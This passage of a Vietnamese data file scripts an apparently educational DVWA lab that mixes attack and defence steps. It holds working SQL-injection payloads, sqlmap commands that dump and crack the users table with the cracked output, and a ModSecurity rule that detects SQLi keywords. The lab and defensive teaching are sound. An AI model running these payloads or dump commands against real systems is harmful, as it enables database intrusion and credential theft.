    phase_tag: "PHẦN CHÍNH • HẠ TẦNG PROXY",
    title: "Cấu hình Burp Suite Proxy 8081 & Vượt Loopback Bypass bằng localtest.me",
    poc_ref: "Burp Proxy • 8081",
    is_defense: false,
    goal: "Thiết lập trạm đánh chặn Burp Suite Community chạy song song với Docker (cổng 8080) và ép trình duyệt Chromium định tuyến 100% gói tin qua Proxy.",
    action_steps: [
      "Mở Burp Suite Community Edition trên máy kiểm thử.",
      "Vào tab Proxy -> Proxy settings -> chọn mục Proxy Listeners -> chỉnh cổng lắng nghe từ 8080 sang 127.0.0.1:8081 (tránh xung đột cổng 8080 của container dvwa).",
      "Bấm nút Open Browser để mở trình duyệt Chromium tích hợp của Burp Suite.",
      "KHÔNG gõ 127.0.0.1:8080 (vì Chromium bỏ qua Proxy cho loopback). Thay vào đó truy cập http://localtest.me:8080, đăng nhập admin / password.",
      "Vào mục DVWA Security ở menu trái -> chọn mức Low -> bấm Submit, sau đó mở mục SQL Injection.",
    ],
    commands: [
      {
        label: "Địa chỉ truy cập trên trình duyệt tích hợp Burp",
        shell: "http",
        template: `http://localtest.me:8080/vulnerabilities/sqli/`,
        explanation:
          "Tên miền localtest.me phân giải về 127.0.0.1 nhưng không nằm trong danh sách ngoại lệ loopback của Chromium, buộc mọi request đi qua Burp Proxy 127.0.0.1:8081.",
      },
    ],
    expected_output: `Proxy Listener Active: 127.0.0.1:8081
DVWA Security Level: low | Username: admin | Route: localtest.me:8080 -> Burp Proxy`,
    academic_explanation:
      "Giải quyết trọn vẹn 2 rào cản kỹ thuật thực tế: (1) Xung đột cổng giữa Docker và Burp đều mặc định 8080; (2) Cơ chế Loopback Bypass của trình duyệt hiện đại.",
    presenter_script:
      "Tiếp nối phần trinh sát, trạm đánh chặn Burp Suite được cấu hình lắng nghe ở cổng 8081 để tránh đụng cổng 8080 của Docker, đồng thời sử dụng tên miền localtest.me:8080 để buộc trình duyệt định tuyến 100% gói tin qua Proxy.",
    simulator_key: "m2-burp",
  },
  {
    id: "m2-s2",
    member_number: 2,
    step_order: 2,
    phase_tag: "PHẦN CHÍNH • POC 2 (PHẦN 1)",
    title: "Đánh chặn Gói tin & Xác nhận Error-based SQLi trên Burp Repeater",
    poc_ref: "PoC 2 • Repeater",
    is_defense: false,
    goal: "Bắt gói tin HTTP GET, trích xuất mã phiên PHPSESSID và gửi payload nháy đơn ' qua Repeater để ép MariaDB nhả lỗi cú pháp SQL.",
    action_steps: [
      "Tại tab Proxy -> Intercept, bật 'Intercept is on'.",
      "Trên trình duyệt, nhập thử số 1 (hoặc ' OR '1'='1) vào ô User ID rồi bấm Submit.",
      "Gói tin GET /vulnerabilities/sqli/?id=1&Submit=Submit bị giữ lại ở Proxy. Nhìn dòng Cookie để lấy chuỗi PHPSESSID (ví dụ: 7nst0hrqrfmv744a5ouj7663b0).",
      "Bấm Ctrl + R (hoặc Cmd + R) gửi gói tin sang tab Repeater, sau đó tắt Intercept is off để trình duyệt không bị treo.",
      "Tại tab Repeater, sửa tham số id= thành dấu nháy đơn ' rồi bấm Send. Quan sát khung Response bên phải báo lỗi MariaDB.",
      "Thử tiếp payload ' OR '1'='1 (hoặc %27+OR+%271%27%3D%271) để chứng minh trích xuất toàn bộ 5 người dùng.",
    ],
    commands: [
      {
        label: "Gói tin HTTP GET kiểm thử Error-based SQLi trên Burp Repeater",
        shell: "http",
        template: `GET /vulnerabilities/sqli/?id=1'&Submit=Submit HTTP/1.1
Host: localtest.me:8080
Cookie: security=low; PHPSESSID={{PHPSESSID}}`,
        explanation:
          "Ký tự nháy đơn (') làm gãy cấu trúc chuỗi '$id' trong câu lệnh SELECT của MariaDB, kích hoạt thông báo lỗi cú pháp trả thẳng về giao diện.",
      },
    ],
    expected_output: `HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

<pre>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''1''' at line 1</pre>`,
    academic_explanation:
      "Xác nhận lỗ hổng Error-based SQL Injection (CWE-89, CVSS v3.1: 8.8 High): dữ liệu đầu vào bị nối trực tiếp vào câu lệnh SQL và thông báo lỗi của MariaDB bị in thẳng ra HTTP Response.",
    presenter_script:
      "Khi đưa gói tin sang Burp Repeater và chèn dấu nháy đơn vào tham số id, máy chủ trả về lỗi cú pháp MariaDB ngay trên giao diện — khẳng định lỗ hổng Error-based SQL Injection mã CWE-89, mức High 8.8 điểm CVSS.",
    simulator_key: "m2-burp",
  },
  {
    id: "m2-s3",
    member_number: 2,
    step_order: 3,
    phase_tag: "PHẦN CHÍNH • POC 2 (PHẦN 2)",
    title: "Tự động hóa Bóc tách Dữ liệu bằng cURL + grep trên Terminal",
    poc_ref: "PoC 2 • cURL",
    is_defense: false,
    goal: "Tái hiện truy vấn từ dòng lệnh bằng PHPSESSID đã lấy từ Burp Suite và dùng biểu thức chính quy grep lọc chính xác tên người dùng từ HTML phức tạp.",
    action_steps: [
      "Mở Terminal trên máy kiểm thử.",
      "Dán giá trị PHPSESSID vừa bắt được trên Burp Suite vào cờ -b của lệnh cURL (lưu ý điền cả security=low).",
      "Ống dẫn (pipe) kết quả HTML qua lệnh grep -o \"First name: [^<]*\" để trích gọn trường dữ liệu mong muốn.",
    ],
    commands: [
      {
        label: "Bóc tách thông tin người dùng qua cURL + grep",
        shell: "zsh / bash",
        template: `curl -s -b "security=low; PHPSESSID={{PHPSESSID}}" \\
  "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" | grep -o "First name: [^<]*"`,
        explanation:
          "Cờ -b đính kèm cookie phiên để vượt qua màn hình đăng nhập DVWA; grep -o chỉ in đúng phần khớp với chuỗi 'First name: ...' cho tới trước thẻ đóng HTML '<'.",
      },
    ],
    expected_output: `First name: admin`,
    academic_explanation:
      "Chứng minh khả năng chuyển đổi từ thao tác trình duyệt thủ công sang kịch bản dòng lệnh (CLI automation), mở đường để bàn giao Cookie phiên cho công cụ SQLMap ở Giai đoạn 3.",
    presenter_script:
      "Từ PHPSESSID bắt được, đưa vào câu lệnh cURL kết hợp regex grep ngay trên Terminal để bóc tách chính xác 'First name: admin' giữa hàng trăm dòng HTML.",
    simulator_key: "m2-curl-log",
  },
  {
    id: "m2-s4",
    member_number: 2,
    step_order: 4,
    phase_tag: "PHÒNG THỦ & ĐIỀU TRA • BLUE TEAM FORENSICS",
    title: "Điều tra Nhật ký Tấn công Apache (Log Forensics)",
    poc_ref: "Forensics • access.log",
    is_defense: true,
    goal: "Đóng vai Blue Team trích xuất và phân tích tệp access.log bên trong container DVWA để chỉ ra các dấu hiệu tấn công (IoC).",
    action_steps: [
      "Chạy lệnh docker exec {{CONTAINER}} grep -E \"(\\%27|\\'|UNION|SELECT)\" /var/log/apache2/access.log | tail -n 5 trên Terminal.",
      "Đọc và phân tích 4 dấu hiệu nhận diện tấn công (Indicators of Compromise - IoC) trên từng dòng log:",
      "1) Địa chỉ IP nguồn thực hiện rà quét; 2) Payload mã hóa URL (%27, UNION, SELECT) nằm trong URI; 3) Chuỗi User-Agent nhận diện công cụ (curl/... vs Mozilla/5.0 Chromium); 4) Mã phản hồi HTTP (200 hoặc 500) và kích thước gói tin bất thường.",
    ],
    commands: [
      {
        label: "Truy vết payload SQLi trong Apache access.log",
        shell: "zsh / bash",
        template: `docker exec {{CONTAINER}} grep -E "(\\%27|\\'|UNION|SELECT)" /var/log/apache2/access.log | tail -n 5`,
        explanation:
          "grep -E dùng regex mở rộng lọc các request chứa dấu nháy đơn (%27 hoặc ') hoặc từ khóa UNION/SELECT trong 5 dòng mới nhất của access.log.",
      },
    ],
    expected_output: `172.17.0.1 - - [04/Nov/2026:02:14:08 +0000] "GET /vulnerabilities/sqli/?id=1%27&Submit=Submit HTTP/1.1" 200 1842 "-" "Mozilla/5.0 (Burp Chromium)"
172.17.0.1 - - [04/Nov/2026:02:15:21 +0000] "GET /vulnerabilities/sqli/?id=%27%20OR%20%271%27%3D%271&Submit=Submit HTTP/1.1" 200 2195 "-" "curl/8.5.0"`,
    academic_explanation:
      "Bổ sung góc nhìn phòng thủ Blue Team / Incident Response: mọi dấu vết khai thác qua Burp hay cURL đều để lại vết định danh IP, User-Agent và biến động kích thước response trong nhật ký máy chủ.",
    presenter_script:
      "Ở góc độ Blue Team, khi truy vấn ngược tệp access.log trong Apache, hệ thống ghi nhận rõ các IoC gồm IP nguồn, chuỗi payload %27/UNION, User-Agent là curl hay trình duyệt và sự thay đổi kích thước gói tin phản hồi.",
    simulator_key: "m2-curl-log",
  },

  // ==================== NGUOI 3 ====================
  {
    id: "m3-s1",
    member_number: 3,
    step_order: 1,
    phase_tag: "PHẦN CHÍNH • SQLMAP TỰ ĐỘNG",
    title: "Cài đặt SQLMap & Chạy Chuỗi 3 Lệnh Khai thác Tự động + Crack MD5",
    poc_ref: "SQLMap • 3 Lệnh",
    is_defense: false,
    goal: "Dùng công cụ tự động SQLMap với PHPSESSID từ bước trước để dò tên CSDL, liệt kê bảng nhạy cảm và dump toàn bộ bảng users kèm bẻ khóa MD5.",
    action_steps: [
      "Kiểm tra hoặc cài đặt SQLMap trên máy bằng lệnh: sudo apt install -y sqlmap.",
      "Lệnh 1 (--dbs): Khai thác danh sách các cơ sở dữ liệu hiện có (tìm thấy information_schema và dvwa).",
      "Lệnh 2 (-D dvwa --tables): Khóa mục tiêu vào CSDL dvwa và liệt kê các bảng (tìm thấy guestbook và users).",
      "Lệnh 3 (-D dvwa -T users --dump): Tải toàn bộ dữ liệu bảng users và để SQLMap tự động chạy Dictionary Attack bẻ khóa cột password (MD5).",
    ],
    commands: [
      {
        label: "Lệnh 1: Liệt kê Cơ sở dữ liệu (--dbs)",
        shell: "zsh / bash",
        template: `sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \\
  --cookie="security=low; PHPSESSID={{PHPSESSID}}" --dbs --batch`,
        explanation: "--cookie truyền phiên đã đăng nhập; --batch tự động chọn đáp án mặc định không cần hỏi lại.",
      },
      {
        label: "Lệnh 2: Liệt kê các Bảng trong CSDL dvwa (--tables)",
        shell: "zsh / bash",
        template: `sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \\
  --cookie="security=low; PHPSESSID={{PHPSESSID}}" -D dvwa --tables --batch`,
        explanation: "-D dvwa chỉ định đúng database dvwa vừa tìm được ở Lệnh 1.",
      },
      {
        label: "Lệnh 3: Trích xuất bảng users & Tự động bẻ khóa MD5 (--dump)",
        shell: "zsh / bash",
        template: `sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \\
  --cookie="security=low; PHPSESSID={{PHPSESSID}}" -D dvwa -T users --dump --batch`,
        explanation: "SQLMap phát hiện cột password dạng MD5 và tự động chạy tấn công từ điển giải mã ra mật khẩu rõ (password, abc123, charley).",
      },
    ],
    expected_output: `available databases [2]:
[*] dvwa
[*] information_schema

Database: dvwa | [2 tables]: guestbook, users

Database: dvwa | Table: users [5 entries]
+---------+---------+--------------------------------------------+
| user_id | user    | password                                   |
+---------+---------+--------------------------------------------+
| 1       | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| 2       | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| 3       | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| 4       | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7            |
| 5       | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------+--------------------------------------------+`,
    academic_explanation:
      "Giải thích lý do dùng SQLMap thay vì gõ tay: tự động thử hàng loạt kỹ thuật (Boolean-based, Error-based, UNION query), bỏ qua bước lặp thủ công và tích hợp sẵn bộ từ điển bẻ khóa hash MD5.",
    presenter_script:
      "Từ cookie phiên hợp lệ, thực thi chuỗi 3 lệnh SQLMap liên hoàn: tìm ra database dvwa, xác định bảng users và dùng --dump trích xuất cả 5 tài khoản. Nhờ --batch, SQLMap tự nhận diện MD5 và bẻ khóa ngược ra mật khẩu gốc như password, abc123 ngay trên Terminal.",
    simulator_key: "m3-sqlmap",
  },
  {
    id: "m3-s2",
    member_number: 3,
    step_order: 2,
    phase_tag: "PHẦN CHÍNH • POC 3",
    title: "Kiểm toán Hộp trắng MariaDB CLI — Chứng minh Điểm yếu MD5 không Salt",
    poc_ref: "PoC 3 • MariaDB",
    is_defense: false,
    goal: "Truy cập trực tiếp vào MariaDB bên trong container dvwa để kiểm toán cấu trúc lưu trữ mật khẩu (PoC 3) và phân tích rủi ro Rainbow Table.",
    action_steps: [
      "Chạy lệnh docker exec -it {{CONTAINER}} mysql -u root -e \"USE dvwa; SELECT user_id, user, password FROM users;\" trên Terminal.",
      "Chỉ trực tiếp vào độ dài chuỗi password: đúng 32 ký tự thập lục phân (128-bit) đặc trưng của thuật toán MD5 đã lỗi thời.",
      "So sánh bản ghi số 1 (admin) và số 5 (smithy): cả hai có chuỗi băm GIỐNG HỆT NHAU là 5f4dcc3b5aa765d61d8327deb882cf99.",
      "Kết luận điểm yếu mật mã học CWE-759 (CVSS 4.9 Medium): lưu hash không có Salt (Unsalted Hash) khiến Rainbow Table giải mã đồng loạt mọi tài khoản trùng mật khẩu.",
    ],
    commands: [
      {
        label: "Kiểm toán trực tiếp bảng users bằng MariaDB CLI (PoC 3)",
        shell: "zsh / bash",
        template: `docker exec -it {{CONTAINER}} mysql -u root -e "USE dvwa; SELECT user_id, user, password FROM users;"`,
        explanation:
          "Truy cập thẳng vào MariaDB với quyền root không cần mật khẩu (đồng thời phơi bày thêm rủi ro lạm dụng đặc quyền kết nối DB).",
      },
    ],
    expected_output: `+---------+---------+----------------------------------+
| user_id | user    | password                         |
+---------+---------+----------------------------------+
|       1 | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
|       2 | gordonb | e99a18c428cb38d5f260853678922e03 |
|       3 | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
|       4 | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
|       5 | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+---------+----------------------------------+`,
    academic_explanation:
      "MD5 là hàm băm nhanh không thiết kế cho mật khẩu; việc thiếu chuỗi ngẫu nhiên (Salt) làm mọi mật khẩu giống nhau cho ra cùng 1 digest, bị tra ngược tức thì qua Rainbow Table (CWE-759, CVSS 4.9).",
    presenter_script:
      "Khi kiểm toán hộp trắng trực tiếp trong MariaDB ở PoC 3, tài khoản số 1 (admin) và số 5 (smithy) có chuỗi băm MD5 giống hệt nhau: 5f4dcc3b5aa765d61d8327deb882cf99. Đây là lỗi băm không Salt (CWE-759), chỉ cần tra bảng cầu vồng một lần là lộ đồng loạt.",
    simulator_key: "m3-mariadb-patch",
  },
  {
    id: "m3-s3",
    member_number: 3,
    step_order: 3,
    phase_tag: "GIA CỐ & PHÒNG THỦ • VÁ LỖI 1 (BCRYPT)",
    title: "Vá lỗi 1 Trực tiếp — Nâng cấp Thuật toán Băm sang Bcrypt (cost = 12)",
    poc_ref: "Vá lỗi 1 • Bcrypt",
    is_defense: true,
    goal: "Kiểm tra hỗ trợ Argon2id/Bcrypt trong PHP CLI, sinh chuỗi băm Bcrypt có Salt tự động (cost = 12) và cập nhật trực tiếp vào MariaDB.",
    action_steps: [
      "Kiểm tra PHP trên container có hỗ trợ PASSWORD_ARGON2ID hay dùng PASSWORD_BCRYPT.",
      "Chạy lệnh PHP CLI sinh hash Bcrypt cho mật khẩu 'password' với hệ số chi phí cost = 12.",
      "Lấy chuỗi hash vừa sinh (bắt đầu bằng $2y$12$...) cập nhật trực tiếp vào bảng users cho user_id = 1 và SELECT kiểm chứng lại.",
    ],
    commands: [
      {
        label: "Kiểm tra Argon2id & Sinh mã băm Bcrypt (cost = 12) qua PHP CLI",
        shell: "zsh / bash",
        template: `docker exec -it {{CONTAINER}} php -r "echo defined('PASSWORD_ARGON2ID') ? 'Supported' : 'Use BCRYPT'; echo PHP_EOL;"
docker exec -it {{CONTAINER}} php -r 'echo password_hash("password", PASSWORD_BCRYPT, ["cost" => 12]) . PHP_EOL;'`,
        explanation:
          "Hàm password_hash() của PHP tự động sinh Salt ngẫu nhiên 22 ký tự cho mỗi lần gọi; cùng mật khẩu 'password' nhưng admin và smithy sẽ ra 2 chuỗi hoàn toàn khác nhau.",
      },
      {
        label: "Cập nhật chuỗi Bcrypt vào MariaDB & Kiểm chứng",
        shell: "zsh / bash",
        template: `docker exec -it {{CONTAINER}} mysql -u root -e "USE dvwa; UPDATE users SET password = '\\$2y\\$12\\$exampleHashedPasswordGeneratedByBcrypt' WHERE user_id = 1; SELECT user_id, user, password FROM users WHERE user_id = 1;"`,
        explanation: "Thay thế chuỗi 32 ký tự MD5 cũ bằng chuỗi Bcrypt 60 ký tự có tiền tố thuật toán + cost + Salt.",
      },
    ],
    expected_output: `Use BCRYPT
$2y$12$K9p8Q3vT2xL7wR4mN6zA1eH8cB5vD0fG2jK4lM6nP8qR0sT2uV4wX

+---------+-------+--------------------------------------------------------------+
| user_id | user  | password                                                     |
+---------+-------+--------------------------------------------------------------+
|       1 | admin | $2y$12$K9p8Q3vT2xL7wR4mN6zA1eH8cB5vD0fG2jK4lM6nP8qR0sT2uV4wX |
+---------+-------+--------------------------------------------------------------+`,
    academic_explanation:
      "Bcrypt/Argon2id là thuật toán băm thích ứng (Adaptive Key Derivation) tích hợp Salt tự động và tham số cost làm chậm brute-force/GPU cracking gấp hàng nghìn lần so với MD5.",
    presenter_script:
      "Để khắc phục PoC 3, tiến hành sinh chuỗi băm chuẩn Bcrypt với cost=12 có tích hợp Salt tự động qua PHP CLI và cập nhật trực tiếp vào MariaDB, loại bỏ hoàn toàn nguy cơ tra ngược Rainbow Table.",
    simulator_key: "m3-mariadb-patch",
  },
  {
    id: "m3-s4",
    member_number: 3,
    step_order: 4,
    phase_tag: "GIA CỐ & PHÒNG THỦ • VÁ LỖI 2 (LEAST PRIVILEGE)",
    title: "Vá lỗi 2 Trực tiếp — Tạo Tài khoản CSDL Đặc quyền Tối thiểu (dvwa_svc)",
    poc_ref: "Vá lỗi 2 • DB Grants",
    is_defense: true,
    goal: "Chấm dứt việc kết nối ứng dụng web bằng tài khoản root toàn quyền, thay thế bằng tài khoản dịch vụ chỉ có quyền SELECT, INSERT, UPDATE trên bảng dvwa.users.",
    action_steps: [
      "Chạy lệnh CREATE USER tạo tài khoản 'dvwa_svc'@'localhost' với mật khẩu mạnh.",
      "Cấp đúng 3 quyền nghiệp vụ cần thiết: GRANT SELECT, INSERT, UPDATE ON dvwa.users.",
      "Chạy FLUSH PRIVILEGES và SHOW GRANTS FOR 'dvwa_svc'@'localhost' để lấy bằng chứng kiểm toán.",
    ],
    commands: [
      {
        label: "Tạo tài khoản dịch vụ Least Privilege & Kiểm tra quyền",
        shell: "zsh / bash",
        template: `docker exec -it {{CONTAINER}} mysql -u root -e "CREATE USER IF NOT EXISTS 'dvwa_svc'@'localhost' IDENTIFIED BY 'SecureSvcPass2026!'; GRANT SELECT, INSERT, UPDATE ON dvwa.users TO 'dvwa_svc'@'localhost'; FLUSH PRIVILEGES; SHOW GRANTS FOR 'dvwa_svc'@'localhost';" `,
        explanation:
          "Không cấp DROP, ALTER, FILE, SUPER hay quyền truy cập vào cơ sở dữ liệu mysql/information_schema nhạy cảm.",
      },
    ],
    expected_output: `+--------------------------------------------------------------------------------+
| Grants for dvwa_svc@localhost                                                  |
+--------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO 'dvwa_svc'@'localhost' IDENTIFIED BY PASSWORD ...        |
| GRANT SELECT, INSERT, UPDATE ON \`dvwa\`.\`users\` TO 'dvwa_svc'@'localhost'       |
+--------------------------------------------------------------------------------+`,
    academic_explanation:
      "Nguyên tắc Đặc quyền Tối thiểu (Least Privilege) giới hạn bán kính thiệt hại (Blast Radius): dù tầng web có sự cố, kẻ tấn công cũng không thể đọc file hệ thống (LOAD_FILE/INTO OUTFILE) hay phá hủy bảng/CSDL khác.",
    presenter_script:
      "Song song với vá mật mã học, áp dụng nguyên tắc Least Privilege bằng cách tạo tài khoản dịch vụ dvwa_svc chỉ được cấp quyền SELECT, INSERT, UPDATE trên đúng bảng dvwa.users thay cho tài khoản root toàn quyền.",
    simulator_key: "m3-mariadb-patch",
  },

  // ==================== NGUOI 4 ====================
  {
    id: "m4-s1",
    member_number: 4,
    step_order: 1,
    phase_tag: "PHẦN CHÍNH + MỞ RỘNG • POC 4",
    title: "Kiểm toán Hộp trắng & Đối chiếu Mã nguồn PHP 4 Cấp độ",
    poc_ref: "PoC 4 • PHP 4 cấp",
    is_defense: true,
    goal: "Đặt cả 4 file mã nguồn (low.php, medium.php, high.php, impossible.php) lên bàn cân kiểm toán để chỉ ra nguyên nhân gốc rễ và lý do các bộ lọc bề mặt vẫn bị vượt qua.",
    action_steps: [
      "Chạy 4 lệnh docker exec {{CONTAINER}} cat -n ... để xuất mã nguồn kèm số dòng của cả 4 cấp độ.",
      "Chỉ rõ low.php: Dòng 5 nhận thẳng $_REQUEST['id'], Dòng 8 nối chuỗi '$id', Dòng 9 in lỗi MariaDB qua mysqli_error().",
      "Giải thích medium.php: Có dùng mysqli_real_escape_string() nhưng câu SQL viết WHERE user_id = $id không có dấu nháy đơn -> SQL coi là biểu thức số học, vô hiệu hóa hàm thoát nháy.",
      "Giải thích high.php: Truyền qua $_SESSION và thêm LIMIT 1 nhưng vi phạm Trust Boundary khi vẫn ghép chuỗi trực tiếp.",
      "Phân tích impossible.php: Phòng thủ 3 lớp gồm checkToken() (dòng 5), is_numeric($id) (dòng 11), và PDO Prepared Statements prepare() + bindParam(..., PDO::PARAM_INT) (dòng 13–15).",
    ],
    commands: [
      {
        label: "Trích xuất mã nguồn 4 cấp độ kèm số dòng (PoC 4 mở rộng)",
        shell: "zsh / bash",
        template: `docker exec {{CONTAINER}} cat -n /var/www/html/vulnerabilities/sqli/source/low.php
docker exec {{CONTAINER}} cat -n /var/www/html/vulnerabilities/sqli/source/medium.php
docker exec {{CONTAINER}} cat -n /var/www/html/vulnerabilities/sqli/source/high.php
docker exec {{CONTAINER}} cat -n /var/www/html/vulnerabilities/sqli/source/impossible.php`,
        explanation: "Cờ cat -n đánh số thứ tự từng dòng lệnh PHP giúp đối chiếu chính xác dòng gây lỗi và dòng phòng thủ.",
      },
    ],
    expected_output: `[low.php] Dòng 5: $id = $_REQUEST['id']; | Dòng 8: WHERE user_id = '$id'; | Dòng 9: mysqli_error(...)
[medium.php] mysqli_real_escape_string(...) nhưng WHERE user_id = $id (thiếu nháy đơn)
[high.php] $_SESSION['id'] + LIMIT 1 nhưng vẫn nối chuỗi (Trust Boundary)
[impossible.php] Dòng 5: checkToken() | Dòng 11: is_numeric($id) | Dòng 13-15: $db->prepare() + bindParam(':id', $id, PDO::PARAM_INT)`,
    academic_explanation:
      "Bản chất của Prepared Statements là tách biệt hoàn toàn Giai đoạn Biên dịch cây cú pháp SQL (Compilation Phase tại prepare) và Giai đoạn Nạp tham số (Execution Phase tại bindParam/execute), khiến dữ liệu nhập vào luôn là Data Literal.",
    presenter_script:
      "Khi kiểm toán hộp trắng 4 cấp độ mã nguồn PHP, lỗi gốc nằm ở dòng 8 của low.php do nối chuỗi trực tiếp; medium và high dùng escape hay session vẫn bị bypass; còn impossible.php chặn đứng hoàn toàn nhờ 3 lớp bảo vệ chuẩn.",
    simulator_key: "m4-php-diff",
  },
  {
    id: "m4-s2",
    member_number: 4,
    step_order: 2,
    phase_tag: "PHẦN CHÍNH • POC 5 GỐC",
    title: "Kiểm chứng Bản vá trên Burp Repeater — PoC 5 Gốc (Chặn ở tầng CSRF)",
    poc_ref: "PoC 5 • 302 Found",
    is_defense: false,
    goal: "Chứng minh khi chuyển Cookie sang security=impossible trên gói tin cũ (không chứa user_token), hệ thống lập tức chặn đứng yêu cầu.",
    action_steps: [
      "Mở lại tab Repeater trên Burp Suite (hoặc copy request từ PoC 2).",
      "Giữ nguyên URL tấn công cũ /vulnerabilities/sqli/?id=1'&Submit=Submit (không có user_token).",
      "Sửa dòng Cookie từ security=low thành security=impossible rồi bấm Send.",
      "Quan sát Response: máy chủ trả về HTTP/1.1 302 Found, Content-Length: 0, chuyển hướng về Location: index.php.",
    ],
    commands: [
      {
        label: "Request PoC 5 Gốc trên Burp Repeater (Thiếu user_token)",
        shell: "http",
        template: `GET /vulnerabilities/sqli/?id=1'&Submit=Submit HTTP/1.1
Host: localtest.me:8080
Cookie: security=impossible; PHPSESSID={{PHPSESSID}}`,
        explanation: "Vì thiếu tham số user_token, hàm checkToken() tại dòng 5 của impossible.php kích hoạt ngay trước khi chạm tới logic kiểm tra $id và truy vấn SQL.",
      },
    ],
    expected_output: `HTTP/1.1 302 Found
Date: Wed, 04 Nov 2026 02:07:32 GMT
Server: Apache/2.4.25 (Debian)
Location: index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8`,
    academic_explanation:
      "Phản hồi 302 Found với Content-Length: 0 chứng minh lớp bảo vệ đầu tiên (Anti-CSRF Token ở dòng 5) đã chặn ngay yêu cầu giả mạo/thiếu token và không hề mở kết nối truy vấn CSDL.",
    presenter_script:
      "Ở PoC 5 gốc, chỉ cần đổi Cookie sang security=impossible và gửi lại gói tin tấn công cũ, hệ thống lập tức trả về HTTP 302 Found chuyển hướng về index.php do bị chặn ngay tại hàm checkToken ở dòng 5.",
    simulator_key: "m4-poc5-waf",
  },
  {
    id: "m4-s3",
    member_number: 4,
    step_order: 3,
    phase_tag: "GIA CỐ & PHÒNG THỦ • POC 5 TINH CHỈNH",
    title: "Kiểm chứng PoC 5 Tinh chỉnh — Điền Đủ user_token để Test Lớp SQLi & PDO",
    poc_ref: "PoC 5 • user_token",
    is_defense: true,
    goal: "Khắc phục hạn chế của PoC 5 gốc (mới test được lớp CSRF) bằng cách truyền user_token hợp lệ, buộc gói tin đi qua dòng 5 để kiểm chứng thực sự lớp is_numeric($id) và PDO Prepared Statements.",
    action_steps: [
      "Trên trình duyệt ở mức security=impossible, mở trang /vulnerabilities/sqli/ và Inspect HTML (hoặc xem Response GET trang chủ SQLi trong Burp) để lấy giá trị ẩn <input type=\"hidden\" name=\"user_token\" value=\"...\">.",
      "Trên Burp Repeater, thử gửi id=1 kèm user_token hợp lệ -> trả về 200 OK hiển thị thông tin người dùng bình thường.",
      "Lấy user_token mới tiếp theo, gửi tham số độc hại id=1' kèm user_token hợp lệ trên Burp Repeater.",
      "Quan sát Response: 200 OK nhưng trang trống/không có kết quả truy vấn và TUYỆT ĐỐI không xuất hiện lỗi cú pháp MariaDB nào.",
    ],
    commands: [
      {
        label: "Request PoC 5 Tinh chỉnh trên Burp Repeater (Đầy đủ user_token)",
        shell: "http",
        template: `GET /vulnerabilities/sqli/?id=1'&Submit=Submit&user_token={{USER_TOKEN}} HTTP/1.1
Host: localtest.me:8080
Cookie: security=impossible; PHPSESSID={{PHPSESSID}}`,
        explanation:
          "Yêu cầu vượt qua checkToken() ở dòng 5, nhưng lập tức bị hàm is_numeric($id) ở dòng 11 trả về false nên bỏ qua khối thực thi CSDL (và nếu vào được PDO cũng bị ép kiểu PDO::PARAM_INT).",
      },
    ],
    expected_output: `HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
<!-- Trang web hiển thị form bình thường, KHÔNG trả về bản ghi nào và KHÔNG lộ bất kỳ thông báo lỗi MariaDB nào -->`,
    academic_explanation:
      "PoC 5 tinh chỉnh chứng minh thực nghiệm trọn vẹn cả 3 lớp phòng thủ (Anti-CSRF + Type Validation + PDO Prepared Statements) đều hoạt động chuẩn xác khi kiểm thử đầy đủ tham số.",
    presenter_script:
      "Nếu chỉ dừng ở 302 Found thì mới chứng minh được lớp chống CSRF. Khi trích xuất user_token hợp lệ từ HTML gắn vào gói tin GET id=1', gói tin vượt qua checkToken() nhưng bị is_numeric() ở dòng 11 chặn đứng, không lộ bất kỳ lỗi CSDL nào.",
    simulator_key: "m4-poc5-waf",
  },
  {
    id: "m4-s4",
    member_number: 4,
    step_order: 4,
    phase_tag: "GIA CỐ & PHÒNG THỦ • WAF & DEFENSE-IN-DEPTH",
    title: "Thiết lập Luật WAF ModSecurity & Tổng kết Phòng thủ Chiều sâu (OWASP A03:2021)",
    poc_ref: "WAF • SecRule 100001",
    is_defense: true,
    goal: "Hoàn thiện lớp phòng ngự tầng biên bằng quy tắc ModSecurity OWASP CRS (chặn HTTP 403 trước khi chạm tới PHP) và tổng kết 3 kiến nghị Defense-in-Depth.",
    action_steps: [
      "Trình bày quy tắc SecRule ID 100001 của WAF ModSecurity kiểm tra tham số ARGS:id bằng biểu thức chính quy @rx.",
      "Giải thích cơ chế hành động: deny với mã trạng thái status:403, ghi nhật ký log mức CRITICAL ngay tại pha 2 (request body/args) trước khi PHP xử lý.",
      "Tổng kết 3 lớp Phòng thủ Chiều sâu (Defense-in-Depth): (1) Code & DB (PDO Prepared Statements + Least Privilege dvwa_svc), (2) Mật mã học (Argon2id/Bcrypt có Salt), (3) Hạ tầng & Tầng biên (Ẩn Banner Apache, Cookie HttpOnly/SameSite=Strict, WAF ModSecurity + Giám sát Log).",
      "Khép lại với thông điệp Security by Design theo chuẩn OWASP Top 10 (A03:2021 - Injection).",
    ],
    commands: [
      {
        label: "Quy tắc WAF ModSecurity (OWASP CRS Custom SecRule)",
        shell: "apache",
        template: `SecRule ARGS:id "@rx (\\'|--|#|/\\*|UNION|SELECT|OR\\s+\\d+=\\d+)" \\
  "id:100001,phase:2,deny,status:403,log,msg:'Phat hien dau hieu bat thuong trong tham so id - Ngan chan boi ModSecurity',tag:'application-multi-rule',severity:'CRITICAL'"`,
        explanation:
